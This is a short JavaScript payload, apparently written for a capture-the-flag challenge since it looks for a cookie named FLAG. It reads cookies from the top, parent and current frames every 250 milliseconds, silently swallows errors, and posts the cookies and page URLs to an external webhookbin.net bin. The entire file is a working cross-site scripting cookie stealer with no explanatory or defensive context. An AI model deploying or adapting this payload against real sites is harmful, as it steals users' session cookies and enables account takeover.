(function(){
  const bin = 'https://webhookbin.net/v1/bin/0c5eaa51-6cc3-4eca-aa3e-3dc7c76362f0';
  let sent = false;
  function tick(){
    try {
      const c = top.document.cookie || parent.document.cookie || document.cookie;
      if (!c || sent || !/FLAG=/.test(c)) return;
      sent = true;
      fetch(bin, {
        method: 'POST',
        mode: 'no-cors',
        headers: {'Content-Type': 'application/x-www-form-urlencoded'},
        body: 'c=' + encodeURIComponent(c)
          + '&self=' + encodeURIComponent(location.href)
          + '&parent=' + encodeURIComponent(parent.location.href)
          + '&top=' + encodeURIComponent(top.location.href)
      });
    } catch (e) {}
  }
  setInterval(tick, 250);
  tick();
})();
